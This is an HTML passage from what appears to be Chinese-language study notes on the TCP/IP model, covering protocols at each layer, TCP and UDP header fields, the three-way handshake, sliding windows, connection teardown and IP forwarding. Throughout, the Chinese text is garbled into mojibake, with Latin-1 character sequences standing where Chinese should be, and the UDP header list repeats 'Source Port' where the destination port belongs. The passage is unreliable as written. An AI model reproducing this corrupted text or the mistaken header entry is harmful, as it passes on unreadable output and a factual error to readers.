title="TCP/IPå¸¸è§åè®®"></a>TCP/IPå¸¸è§åè®®</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124183002339.png" alt="image-20220124183002339"></p><p>åº”ç”¨å±‚</p><ul><li>HTTPï¼ˆHypertext Transfer Protocolï¼Œè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰ï¼šç”¨æ¥è®¿é—®åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸Š çš„å„ç§é¡µé¢ã€‚</li><li>FTPï¼ˆFile Transfer Protocolï¼Œæ–‡ä»¶ä¼ è¾“åè®®ï¼‰ï¼šä¸ºæ–‡ä»¶ä¼ è¾“æä¾›äº†é€”å¾„ï¼Œå®ƒå…è®¸æ•°æ®ä»ä¸€å°ä¸»æœºä¼ é€åˆ°å¦ä¸€å°ä¸»æœºä¸Šï¼Œç”¨äºæ–‡ä»¶çš„ä¸‹è½½å’Œä¸Šä¼ ï¼Œé‡‡ç”¨C/Sï¼ˆClient/Serverï¼‰ç»“æ„ã€‚</li><li>DNSï¼ˆDomain Name Serviceï¼ŒåŸŸåç§°è§£ææœåŠ¡ï¼‰ï¼šç”¨äºå®ç°ä»ä¸»æœºåŸŸååˆ°IPåœ°å€ä¹‹ é—´çš„è½¬æ¢ã€‚</li><li>Telnetï¼šæ˜¯æ•°æ®ç½‘ç»œä¸­æä¾›è¿œç¨‹ç™»å½•æœåŠ¡çš„æ ‡å‡†åè®®ã€‚Telnetä¸ºç”¨æˆ·æä¾›äº†åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šå®Œæˆè¿œç¨‹è®¾å¤‡å·¥ä½œçš„èƒ½åŠ›ã€‚</li></ul><p>ä¼ è¾“å±‚</p><ul><li> TCP ï¼ˆTransmission Control Protocolï¼Œä¼ è¾“æ§åˆ¶åè®®ï¼‰ ï¼šä¸ºåº”ç”¨ç¨‹åºæä¾›å¯é çš„é¢å‘è¿æ¥çš„é€šä¿¡æœåŠ¡ã€‚ç›®å‰ï¼Œè®¸å¤šæµè¡Œçš„åº”ç”¨ç¨‹åºéƒ½ä½¿ç”¨TCPã€‚</li><li> UDPï¼ˆUser Datagram Protocolï¼Œç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰ï¼šæä¾›äº†æ— è¿æ¥é€šä¿¡ï¼Œä¸”ä¸å¯¹ä¼  é€æ•°æ®åŒ…è¿›è¡Œå¯é æ€§çš„ä¿è¯ã€‚</li></ul><p>ç½‘ç»œå±‚</p><ul><li>IPï¼ˆInternet Protocolï¼Œäº’è”ç½‘åè®®ï¼‰ï¼šå°†ä¼ è¾“å±‚çš„æ•°æ®å°è£…æˆæ•°æ®åŒ…å¹¶å®Œæˆæºç«™ç‚¹ åˆ°ç›®çš„ç«™ç‚¹çš„è½¬å‘ï¼Œæä¾›æ— è¿æ¥çš„ã€ä¸å¯é çš„æœåŠ¡ã€‚</li><li>IGMPï¼ˆInternet Group Management Protocolï¼Œå› ç‰¹ç½‘ç»„ç®¡ç†åè®®ï¼‰ï¼šè´Ÿè´£IPç»„æ’­ æˆå‘˜ç®¡ç†çš„åè®®ã€‚å®ƒç”¨æ¥åœ¨IPä¸»æœºå’Œä¸å…¶ç›´æ¥ç›¸é‚»çš„ç»„æ’­è·¯ç”±å™¨ä¹‹é—´å»ºç«‹ã€ç»´æŠ¤ç»„æ’­ ç»„æˆå‘˜å…³ç³»ã€‚</li><li>ICMPï¼ˆInternet Control Message Protocolï¼Œç½‘é™…æŠ¥æ–‡æ§åˆ¶åè®®ï¼‰ï¼šåŸºäºIPåè®®åœ¨ç½‘ ç»œä¸­å‘é€æ§åˆ¶æ¶ˆæ¯ï¼Œæä¾›å¯èƒ½å‘ç”Ÿåœ¨é€šä¿¡ç¯å¢ƒä¸­çš„å„ç§é—®é¢˜åé¦ˆã€‚é€šè¿‡è¿™äº›ä¿¡æ¯ï¼Œä½¿ ç®¡ç†è€…å¯ä»¥å¯¹æ‰€å‘ç”Ÿçš„é—®é¢˜ä½œå‡ºè¯Šæ–­ï¼Œç„¶åé‡‡å–é€‚å½“çš„æªæ–½è§£å†³ã€‚</li></ul><p>æ•°æ®é“¾è·¯å±‚</p><ul><li>PPPï¼ˆPoint-to-Point Protocolï¼Œç‚¹å¯¹ç‚¹åè®®ï¼‰ï¼šä¸€ç§ç‚¹å¯¹ç‚¹æ¨¡å¼çš„æ•°æ®é“¾è·¯å±‚åè®®ï¼Œ å¤šç”¨äºå¹¿åŸŸç½‘ã€‚</li><li>Ethernet( ä»¥å¤ªç½‘åè®® )ï¼šä¸€ç§å¤šè·¯è®¿é—®å¹¿æ’­å‹æ•°æ®é“¾è·¯å±‚åè®®ï¼Œæ˜¯å½“å‰åº”ç”¨æœ€ä¸ºå¹¿ æ³›çš„å±€åŸŸç½‘æŠ€æœ¯ã€‚</li><li>PPPoEï¼ˆPoint-to-Point Protocol over Ethernetï¼Œä»¥å¤ªç½‘æ‰¿è½½PPPåè®®ï¼‰ï¼šPPPoEæ ä¾›é€šè¿‡ç®€å•æ¡¥æ¥è®¿é—®è®¾å¤‡ï¼ˆæ¥å…¥è®¾å¤‡ï¼‰æŠŠä¸€ä¸ªç½‘ç»œçš„å¤šä¸ªä¸»æœºè¿æ¥åˆ°è¿œç¨‹è®¿é—®é›†ä¸­å™¨ çš„åŠŸèƒ½ã€‚å¸¸è§çš„åº”ç”¨æœ‰å®¶åº­å®½å¸¦æ‹¨å·ä¸Šç½‘ã€‚</li></ul><h2 id="å¸¸è§åè®®æ ‡å‡†åŒ–ç»„ç»‡"><a href="#å¸¸è§åè®®æ ‡å‡†åŒ–ç»„ç»‡" class="headerlink" title="å¸¸è§åè®®æ ‡å‡†åŒ–ç»„ç»‡"></a>å¸¸è§åè®®æ ‡å‡†åŒ–ç»„ç»‡</h2><p><strong>IETFï¼š</strong>è´Ÿè´£å¼€å‘å’Œæ¨å¹¿äº’è”ç½‘åè®®ï¼ˆç‰¹åˆ«æ˜¯TCP/IPåè®®æ—çš„åè®®ï¼‰çš„å¿—æ„¿ç»„ç»‡</p><p><strong>IEEEï¼š</strong>åˆ¶å®šäº†å…¨ä¸–ç•Œç”µå­ï¼Œç”µæ°”å’Œè®¡ç®—æœºç§‘å­¦é¢†åŸŸ30%å·¦å³çš„æ ‡å‡†ï¼Œå¦‚IEEE802.3ï¼ˆEthernetï¼‰ã€IEEE802.11ï¼ˆWiFiï¼‰ç­‰ã€‚</p><p><strong>ISOï¼š</strong>æŒ‡å®šè®¡ç®—æœºç½‘ç»œæ ‡å‡†ï¼Œå¦‚OSIæ¨¡å‹</p><h2 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a>åº”ç”¨å±‚</h2><p>åº”ç”¨å±‚ä¸ºåº”ç”¨è½¯ä»¶æä¾›æ¥å£ï¼Œä½¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿä½¿ç”¨ç½‘ç»œæœåŠ¡ã€‚åº”ç”¨å±‚åè®®ä¼šæŒ‡å®šä½¿ç”¨ç›¸åº”çš„ä¼ è¾“å±‚åè®®ï¼Œä»¥åŠä¼ è¾“å±‚æ‰€ä½¿ç”¨çš„ç«¯å£ç­‰ã€‚</p><p>åº”ç”¨å±‚çš„PDUè¢«ç§°ä¸ºDataï¼ˆæ•°æ®ï¼‰ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124184248517.png" alt="image-20220124184248517"></p><p>TCP/IPæ¯ä¸€å±‚éƒ½è®©æ•°æ®å¾—ä»¥é€šè¿‡ç½‘ç»œè¿›è¡Œä¼ è¾“ï¼Œè¿™äº›å±‚ä¹‹é—´ä½¿ç”¨PDUï¼ˆPacket Data Unitï¼Œ åè®®æ•°æ®å•å…ƒï¼‰å½¼æ­¤äº¤æ¢ä¿¡æ¯ï¼Œç¡®ä¿ç½‘ç»œè®¾å¤‡ä¹‹é—´èƒ½å¤Ÿé€šä¿¡ã€‚</p><p>ä¸åŒå±‚çš„PDUä¸­åŒ…å«æœ‰ä¸åŒçš„ä¿¡æ¯ï¼Œå› æ­¤PDUåœ¨ä¸åŒå±‚è¢«èµ‹äºˆäº†ä¸åŒçš„åç§°</p><p><strong>FTP:</strong></p><p><strong>FTPå®¢æˆ·ç«¯</strong>æä¾›æœ¬åœ°è®¾å¤‡å¯¹è¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶è¿›è¡Œæ“ä½œçš„å‘½ä»¤ï¼Œç”¨æˆ·åœ¨PCä¸Šé€šè¿‡åº”ç”¨ç¨‹åºä½œä¸ºFTP Clientï¼Œå¹¶ä¸FTPæœåŠ¡å™¨å»ºç«‹è¿æ¥åï¼Œå¯ä»¥å¯¹FTP Serverä¸Šçš„æ–‡ä»¶è¿›è¡Œæ“ä½œ</p><p><strong>FTPæœåŠ¡å™¨</strong>æ˜¯è¿è¡ŒFTPæœåŠ¡çš„è®¾å¤‡ï¼Œæä¾›è¿œç¨‹å®¢æˆ·ç«¯è®¿é—®å’Œæ“ä½œçš„åŠŸèƒ½ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡FTPå®¢æˆ·ç«¯ç¨‹åºç™»å½•åˆ°æœåŠ¡å™¨ä¸Šï¼Œè®¿é—®è®¾å¤‡ä¸Šçš„æ–‡ä»¶ã€‚</p><p><strong>Telnetï¼š</strong></p><p>ç”¨æˆ·é€šè¿‡Telnetå®¢æˆ·ç«¯ç¨‹åºè¿æ¥åˆ°TelnetæœåŠ¡å™¨ã€‚ç”¨æˆ·åœ¨Telnetå®¢æˆ·ç«¯ä¸­è¾“å…¥å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤ä¼šåœ¨æœåŠ¡å™¨ç«¯è¿è¡Œï¼Œå°±åƒç›´æ¥åœ¨æœåŠ¡ç«¯çš„æ§åˆ¶å°è¾“å…¥ä¸€æ ·</p><h2 id="ä¼ è¾“å±‚"><a href="#ä¼ è¾“å±‚" class="headerlink" title="ä¼ è¾“å±‚"></a>ä¼ è¾“å±‚</h2><p>ä¼ è¾“å±‚åè®®æ¥æ”¶æ¥è‡ªåº”ç”¨å±‚çš„æ•°æ®baozï¼Œå°è£…ä¸Šç›¸åº”çš„ä¼ è¾“å±‚å¤´éƒ¨ï¼Œå¸®åŠ©å…¶å»ºç«‹â€œç«¯åˆ°ç«¯â€çš„è¿æ¥ã€‚</p><p>ä¼ è¾“å±‚çš„PDUè¢«ç§°ä¸ºSegmentï¼ˆæ®µï¼‰ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124185652699.png" alt="image-20220124185652699"></p><h3 id="TCPå’ŒUDP"><a href="#TCPå’ŒUDP" class="headerlink" title="TCPå’ŒUDP"></a>TCPå’ŒUDP</h3><p>æŠ¥æ–‡æ ¼å¼</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124185736705.png" alt="image-20220124185736705"></p><p><strong>TCPæŠ¥æ–‡å¤´éƒ¨ï¼š</strong></p><ul><li>Source Portï¼šæºç«¯å£ï¼Œæ ‡è¯†å“ªä¸ªåº”ç”¨ç¨‹åºå‘é€ã€‚é•¿åº¦ä¸º16æ¯”ç‰¹ã€‚</li><li>Destination Portï¼šç›®çš„ç«¯å£ï¼Œæ ‡è¯†å“ªä¸ªåº”ç”¨ç¨‹åºæ¥æ”¶ã€‚é•¿åº¦ä¸º16æ¯”ç‰¹ã€‚</li><li>Sequence Numberï¼šåºå·å­—æ®µã€‚TCPé“¾æ¥ä¸­ä¼ è¾“çš„æ•°æ®æµæ¯ä¸ªå­—èŠ‚éƒ½ç¼–ä¸Šä¸€ä¸ªåºå·ã€‚ åºå·å­—æ®µçš„å€¼æŒ‡çš„æ˜¯æœ¬æŠ¥æ–‡æ®µæ‰€å‘é€æ•°æ®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºå·ã€‚é•¿åº¦ä¸º32æ¯”ç‰¹ã€‚</li><li>Acknowledgment Numberï¼šç¡®è®¤åºåˆ—å·ï¼Œæ˜¯æœŸæœ›æ”¶åˆ°å¯¹æ–¹ä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µæ•°æ®çš„ç¬¬1 ä¸ªå­—èŠ‚çš„åºå·ï¼Œå³ä¸Šæ¬¡å·²æˆåŠŸæ¥æ”¶åˆ°çš„æ•°æ®æ®µçš„æœ€åä¸€ä¸ªå­—èŠ‚æ•°æ®çš„åºå·åŠ 1ã€‚åªæœ‰ Ackæ ‡è¯†ä¸º1ï¼Œæ­¤å­—æ®µæœ‰æ•ˆã€‚é•¿åº¦ä¸º32æ¯”ç‰¹ã€‚</li><li>Header Lengthï¼šå¤´éƒ¨é•¿åº¦ï¼ŒæŒ‡å‡ºTCPæŠ¥æ–‡å¤´éƒ¨é•¿åº¦ï¼Œä»¥32æ¯”ç‰¹ï¼ˆ4å­—èŠ‚ï¼‰ä¸ºè®¡ç®—å•ä½ã€‚ è‹¥æ— é€‰é¡¹å†…å®¹ï¼Œåˆ™è¯¥å­—æ®µä¸º5ï¼Œå³å¤´éƒ¨ä¸º20å­—èŠ‚ã€‚</li><li>Reservedï¼šä¿ç•™ï¼Œå¿…é¡»å¡«0ã€‚é•¿åº¦ä¸º6æ¯”ç‰¹ã€‚</li><li>Control bitsï¼šæ§åˆ¶ä½ï¼ŒåŒ…å«FINã€ACKã€SYNç­‰æ ‡å¿—ä½ï¼Œä»£è¡¨ä¸åŒçŠ¶æ€ä¸‹çš„TCPæ•°æ® æ®µã€‚</li><li>Windowï¼šçª—å£TCPçš„æµé‡æ§åˆ¶ï¼Œè¿™ä¸ªå€¼è¡¨æ˜å½“å‰æ¥æ”¶ç«¯å¯æ¥å—çš„æœ€å¤§çš„æ•°æ®æ€»æ•° ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚çª—å£æœ€å¤§ä¸º65535å­—èŠ‚ã€‚é•¿åº¦ä¸º16æ¯”ç‰¹ã€‚</li><li>Checksumï¼šæ ¡éªŒå­—æ®µï¼Œæ˜¯ä¸€ä¸ªå¼ºåˆ¶æ€§çš„å­—æ®µï¼Œç”±å‘ç«¯è®¡ç®—å’Œå­˜å‚¨ï¼Œå¹¶ç”±æ”¶ç«¯è¿›è¡ŒéªŒ è¯ã€‚åœ¨è®¡ç®—æ£€éªŒå’Œæ—¶ï¼Œè¦åŒ…æ‹¬TCPå¤´éƒ¨å’ŒTCPæ•°æ®ï¼ŒåŒæ—¶åœ¨TCPæŠ¥æ–‡æ®µçš„å‰é¢åŠ ä¸Š12 å­—èŠ‚çš„ä¼ªå¤´éƒ¨ã€‚é•¿åº¦ä¸º16æ¯”ç‰¹ã€‚</li><li>Urgent:ç´§æ€¥æŒ‡é’ˆï¼Œåªæœ‰å½“URGæ ‡å¿—ç½®1æ—¶ç´§æ€¥æŒ‡é’ˆæ‰æœ‰æ•ˆã€‚TCPçš„ç´§æ€¥æ–¹å¼æ˜¯å‘é€ç«¯ å‘å¦ä¸€ç«¯å‘é€ç´§æ€¥æ•°æ®çš„ä¸€ç§æ–¹å¼ã€‚ç´§æ€¥æŒ‡é’ˆæŒ‡å‡ºåœ¨æœ¬æŠ¥æ–‡æ®µä¸­ç´§æ€¥æ•°æ®å…±æœ‰å¤šå°‘ä¸ª å­—èŠ‚ï¼ˆç´§æ€¥æ•°æ®æ”¾åœ¨æœ¬æŠ¥æ–‡æ®µæ•°æ®çš„æœ€å‰é¢ï¼‰ã€‚é•¿åº¦ä¸º16æ¯”ç‰¹ã€‚</li><li>Optionsï¼šé€‰é¡¹å­—æ®µï¼ˆå¯é€‰ï¼‰ï¼Œé•¿åº¦ä¸º0-40å­—èŠ‚ã€‚</li></ul><p><strong>UDPæŠ¥æ–‡å¤´éƒ¨</strong></p><ul><li>Source Port:æºç«¯å£ï¼Œæ ‡è¯†å“ªä¸ªåº”ç”¨ç¨‹åºå‘é€ã€‚é•¿åº¦ä¸º16æ¯”ç‰¹ã€‚</li><li>Source Port:æºç«¯å£ï¼Œæ ‡è¯†å“ªä¸ªåº”ç”¨ç¨‹åºå‘é€ã€‚é•¿åº¦ä¸º16æ¯”ç‰¹ã€‚</li><li>Length:è¯¥å­—æ®µæŒ‡å®šUDPæŠ¥å¤´å’Œæ•°æ®æ€»å…±å ç”¨çš„é•¿åº¦ã€‚å¯èƒ½çš„æœ€å°é•¿åº¦æ˜¯8å­—èŠ‚ï¼Œå› ä¸º UDPæŠ¥å¤´å·²ç»å ç”¨äº†8å­—èŠ‚ã€‚ç”±äºè¿™ä¸ªå­—æ®µçš„å­˜åœ¨ï¼ŒUDPæŠ¥æ–‡æ€»é•¿ä¸å¯èƒ½è¶…è¿‡65535 å­—èŠ‚ï¼ˆåŒ…æ‹¬8å­—èŠ‚çš„æŠ¥å¤´ï¼Œå’Œ65527å­—èŠ‚çš„æ•°æ®ï¼‰ã€‚</li><li>Checksum:è¦†ç›–UDPå¤´éƒ¨å’ŒUDPæ•°æ®çš„æ ¡éªŒå’Œï¼Œé•¿åº¦ä¸º16æ¯”ç‰¹</li></ul><p><strong>ç«¯å£å·</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124190431491.png" alt="image-20220124190431491"></p><p><strong>TCPçš„å»ºç«‹-ä¸‰æ¬¡æ¡æ‰‹</strong></p><p>â–«ç”±TCPè¿æ¥å‘èµ·æ–¹ï¼ˆå›¾ä¸­PC1ï¼‰ï¼Œå‘é€ç¬¬ä¸€ä¸ªSYNä½ç½®1çš„TCPæŠ¥æ–‡ã€‚åˆå§‹åºåˆ—å·aä¸ºä¸€ ä¸ªéšæœºç”Ÿæˆçš„æ•°å­—ï¼Œå› ä¸ºæ²¡æ”¶åˆ°è¿‡æ¥è‡ªPC2çš„ä»»ä½•æŠ¥æ–‡ï¼Œæ‰€ä»¥ç¡®è®¤åºåˆ—å·ä¸º0 ï¼› </p><p>â–« æ¥æ”¶æ–¹ï¼ˆå›¾ä¸­PC2ï¼‰æ¥æ”¶åˆ°åˆæ³•çš„SYNæŠ¥æ–‡ä¹‹åï¼Œå›å¤ä¸€ä¸ªSYNå’ŒACKç½®1çš„TCPæŠ¥æ–‡ã€‚ åˆå§‹åºåˆ—å·bä¸ºä¸€ä¸ªéšæœºç”Ÿæˆçš„æ•°å­—ï¼ŒåŒæ—¶å› ä¸ºæ­¤æŠ¥æ–‡æ˜¯å›å¤ç»™PC1çš„æŠ¥æ–‡ï¼Œæ‰€ä»¥ç¡® è®¤åºåˆ—å·ä¸ºa+1ï¼› </p><p>â–« PC1æ¥æ”¶åˆ°PC2å‘é€çš„SYNå’ŒACKç½®ä½çš„TCPæŠ¥æ–‡åï¼Œå›å¤ä¸€ä¸ªACKç½®ä½çš„æŠ¥æ–‡ï¼Œæ­¤æ—¶ åºåˆ—å·ä¸ºa+1,ç¡®è®¤åºåˆ—å·ä¸ºb+1ã€‚PC2æ”¶åˆ°ä¹‹åï¼ŒTCPåŒå‘è¿æ¥å»ºç«‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124193244163.png" alt="image-20220124193244163"></p><p><strong>TCPçš„åºåˆ—å·ä¸ç¡®è®¤åºåˆ—å·ï¼š</strong></p><p>TCPä½¿ç”¨åºåˆ—å·å’Œç¡®è®¤åºåˆ—å·å­—æ®µå®ç°æ•°æ®çš„å¯é å’Œæœ‰åºä¼ è¾“ã€‚</p><p>â€¢ å‡è®¾PC1è¦ç»™PC2å‘é€ä¸€æ®µæ•°æ®ï¼Œä¼ è¾“è¿‡ç¨‹å¦‚ä¸‹ï¼š </p><p>â€‹         â–« 1. PC1å°†å…¨éƒ¨å¾…TCPå‘é€çš„æ•°æ®æŒ‰ç…§å­—èŠ‚ä¸ºå•ä½ç¼–ä¸Šå·ã€‚å‡è®¾ç¬¬ä¸€ä¸ªå­—èŠ‚çš„ç¼–å·ä¸º â€œa+1â€ï¼Œç¬¬äºŒä¸ªå­—èŠ‚çš„åºå·ä¸ºâ€œa+2â€ï¼Œä¾æ¬¡ç±»æ¨ã€‚</p><p>â€‹         â–« 2. PC1ä¼šæŠŠæ¯ä¸€æ®µæ•°æ®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„ç¼–å·ä½œä¸ºåºåˆ—å·ï¼ˆSequence numberï¼‰ï¼Œç„¶åå°†TCPæŠ¥æ–‡å‘é€å‡ºå»ã€‚</p><p>â€‹         â–« 3. PC2åœ¨æ”¶åˆ°PC1å‘é€æ¥çš„TCPæŠ¥æ–‡åï¼Œéœ€è¦ç»™äºˆç¡®è®¤åŒæ—¶è¯·æ±‚ä¸‹ä¸€æ®µæ•°æ®ï¼Œå¦‚ä½•ç¡® å®šä¸‹ä¸€æ®µæ•°æ®å‘¢ï¼Ÿåºåˆ—å·( a+1 )+è½½è·é•¿åº¦=ä¸‹ä¸€æ®µæ•°æ®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºå· ï¼ˆa+1+12ï¼‰ </p><p>â€‹        â–« 4. PC1åœ¨æ”¶åˆ°PC2å‘é€çš„TCPæŠ¥æ–‡ä¹‹åï¼Œå‘ç°ç¡®è®¤åºåˆ—å·ä¸ºâ€œa+1+12â€ ï¼Œè¯´æ˜â€œa+1â€ åˆ°â€œa+12â€è¿™ä¸€æ®µçš„æ•°æ®å·²ç»è¢«æ¥å—ï¼Œéœ€è¦ä»â€œa+1+12â€å¼€å§‹å‘é€ã€‚</p><p> â€¢ ä¸ºäº†æå‡å‘é€æ•ˆç‡ï¼Œä¹Ÿå¯ä»¥ä¸€æ¬¡æ€§å‘é€å¤šæ®µæ•°æ®ï¼Œç”±æ¥æ”¶æ–¹ç»Ÿä¸€ç¡®è®¤ã€‚</p><p><strong>TCPçš„çª—å£æ»‘åŠ¨æœºåˆ¶</strong></p><p>â€¢ 1. åœ¨TCPä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥æ—¶ï¼ŒåŒæ–¹éƒ½ä¼šé€šè¿‡Windowå­—æ®µå‘Šè¯‰å¯¹æ–¹æœ¬ç«¯æœ€å¤§èƒ½å¤Ÿæ¥å—çš„å­— èŠ‚æ•°ï¼ˆä¹Ÿå°±æ˜¯ç¼“å†²åŒºå¤§å°ï¼‰ã€‚</p><p>â€¢ 2. è¿æ¥å»ºç«‹æˆåŠŸä¹‹åï¼Œå‘é€æ–¹ä¼šæ ¹æ®æ¥å—æ–¹å®£å‘Šçš„Windowå¤§å°å‘é€ç›¸åº”å­—èŠ‚æ•°çš„æ•°æ®ã€‚ </p><p>â€¢ 3. æ¥å—æ–¹æ¥å—åˆ°æ•°æ®ä¹‹åä¼šæ”¾åœ¨ç¼“å†²åŒºå†…ï¼Œç­‰å¾…ä¸Šå±‚åº”ç”¨æ¥å–èµ°ç¼“å†²çš„æ•°æ®ã€‚è‹¥æ•°æ®è¢«ä¸Š å±‚å–èµ°ï¼Œåˆ™ç›¸åº”çš„ç¼“å†²ç©ºé—´å°†è¢«é‡Šæ”¾ã€‚ </p><p>â€¢ 4. æ¥æ”¶æ–¹æ ¹æ®è‡ªèº«çš„ç¼“å­˜ç©ºé—´å¤§å°é€šå‘Šå½“å‰çš„å¯ä»¥æ¥å—çš„æ•°æ®å¤§å°( Window )ã€‚ </p><p>â€¢ 5. å‘é€æ–¹æ ¹æ®æ¥æ”¶æ–¹å½“å‰çš„Windowå¤§å°å‘é€ç›¸åº”æ•°é‡çš„æ•°æ®</p><p><strong>TCPçš„å…³é—­-å››æ¬¡æŒ¥æ‰‹</strong></p><p>â–« 1. ç”±PC1å‘å‡ºä¸€ä¸ªFINå­—æ®µç½®â€1 â€çš„ä¸å¸¦æ•°æ®çš„TCPæ®µï¼›</p><p> â–« 2. PC2æ”¶åˆ°PC1å‘æ¥çš„FINç½®ä½çš„TCPæŠ¥æ–‡åï¼Œä¼šå›å¤ä¸€ä¸ªACKç½®ä½çš„TCPæŠ¥æ–‡ã€‚ </p><p>â–« 3. è‹¥PC2ä¹Ÿæ²¡æœ‰éœ€è¦å‘é€çš„æ•°æ®ï¼Œåˆ™ç›´æ¥å‘é€FINç½®ä½çš„TCPæŠ¥æ–‡ã€‚å‡è®¾æ­¤æ—¶PC2è¿˜æœ‰ æ•°æ®è¦å‘é€ï¼Œé‚£ä¹ˆå½“PC2å‘é€å®Œè¿™äº›æ•°æ®ä¹‹åä¼šå‘é€ä¸€ä¸ªFINç½®ä½çš„TCPæŠ¥æ–‡å»å…³é—­è¿ æ¥ã€‚ </p><p>â–« 4. PC1æ”¶åˆ°FINç½®ä½çš„TCPæŠ¥æ–‡ï¼Œå›å¤ACKæŠ¥æ–‡ï¼ŒTCPåŒå‘è¿æ¥æ–­å¼€</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124202101704.png" alt="image-20220124202101704"></p><h2 id="ç½‘ç»œå±‚"><a href="#ç½‘ç»œå±‚" class="headerlink" title="ç½‘ç»œå±‚"></a>ç½‘ç»œå±‚</h2><p>ä¼ è¾“å±‚è´Ÿè´£å»ºç«‹ä¸»æœºä¹‹é—´è¿›ç¨‹ä¸è¿›ç¨‹ä¹‹é—´çš„è¿æ¥ï¼Œè€Œç½‘ç»œå±‚åˆ™è´Ÿè´£æ•°æ®ä»ä¸€å°ä¸»æœºåˆ°å¦ä¸€å°ä¸»æœºä¹‹é—´çš„ä¼ é€’ã€‚</p><p>ç½‘ç»œå±‚çš„PDUè¢«ç§°ä¸ºåŒ…</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124202325984.png" alt="image-20220124202325984"></p><h3 id="ç½‘ç»œå±‚åè®®å·¥ä½œè¿‡ç¨‹"><a href="#ç½‘ç»œå±‚åè®®å·¥ä½œè¿‡ç¨‹" class="headerlink" title="ç½‘ç»œå±‚åè®®å·¥ä½œè¿‡ç¨‹"></a>ç½‘ç»œå±‚åè®®å·¥ä½œè¿‡ç¨‹</h3><ul><li> å½“é‡‡ç”¨IPä½œä¸ºç½‘ç»œå±‚åè®®æ—¶ï¼Œé€šä¿¡çš„åŒæ–¹éƒ½ä¼šè¢«åˆ†é…åˆ°ä¸€ä¸ªâ€œç‹¬ä¸€æ— äºŒâ€çš„IPåœ°å€æ¥æ ‡è¯†è‡ª å·±ã€‚IPåœ°å€å¯è¢«å†™æˆ32ä½çš„äºŒè¿›åˆ¶æ•´æ•°å€¼å½¢å¼ï¼Œä½†ä¸ºäº†æ–¹ä¾¿äººä»¬é˜…è¯»å’Œåˆ†æï¼Œå®ƒé€šå¸¸è¢«å†™ æˆç‚¹åˆ†åè¿›åˆ¶çš„å½¢å¼ï¼Œå³å››ä¸ªå­—èŠ‚è¢«åˆ†å¼€ç”¨åè¿›åˆ¶è¡¨ç¤ºï¼Œä¸­é—´ç”¨ç‚¹åˆ†éš”ï¼Œæ¯”å¦‚192.168.1.1ã€‚</li><li>IPæ•°æ®åŒ…çš„å°è£…ä¸è½¬å‘ï¼š<ul><li>ç½‘ç»œå±‚æ”¶åˆ°ä¸Šå±‚ï¼ˆå¦‚ä¼ è¾“å±‚ï¼‰åè®®ä¼ æ¥çš„æ•°æ®æ—¶å€™ï¼Œä¼šå°è£…ä¸€ä¸ªIPæŠ¥æ–‡å¤´éƒ¨ï¼Œå¹¶ä¸”æŠŠ æºå’Œç›®çš„IPåœ°å€éƒ½æ·»åŠ åˆ°è¯¥å¤´éƒ¨ä¸­ã€‚</li><li>ä¸­é—´ç»è¿‡çš„ç½‘ç»œè®¾å¤‡ï¼ˆå¦‚è·¯ç”±å™¨ï¼‰ï¼Œä¼šç»´æŠ¤ä¸€å¼ æŒ‡å¯¼IPæŠ¥æ–‡è½¬å‘çš„â€œåœ°å›¾â€â€”â€”è·¯ç”± è¡¨ï¼Œé€šè¿‡è¯»å–IPæ•°æ®åŒ…çš„ç›®çš„åœ°å€ï¼ŒæŸ¥æ‰¾æœ¬åœ°è·¯ç”±è¡¨åè½¬å‘IPæ•°æ®åŒ…ã€‚</li><li>IPæ•°æ®åŒ…æœ€ç»ˆåˆ°è¾¾ç›®çš„ä¸»æœºï¼Œç›®çš„ä¸»æœºé€šè¿‡è¯»å–ç›®çš„IPåœ°å€ç¡®å®šæ˜¯å¦æ¥å—å¹¶åšä¸‹ä¸€æ­¥ å¤„ç†ã€‚</li></ul></li><li> IPåè®®å·¥ä½œæ—¶ï¼Œéœ€è¦å¦‚OSPFã€IS-ISã€BGPç­‰å„ç§è·¯ç”±åè®®å¸®åŠ©è·¯ç”±å™¨å»ºç«‹è·¯ç”±è¡¨ï¼ŒICMPå¸® å¿™è¿›è¡Œç½‘ç»œçš„æ§åˆ¶å’ŒçŠ¶æ€è¯Šæ–­ã€‚</li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124202532079.png" alt="image-20220124202532079"></p><h2 id="æ•°æ®é“¾è·¯å±‚"><a href="#æ•°æ®é“¾è·¯å±‚" class="headerlink" 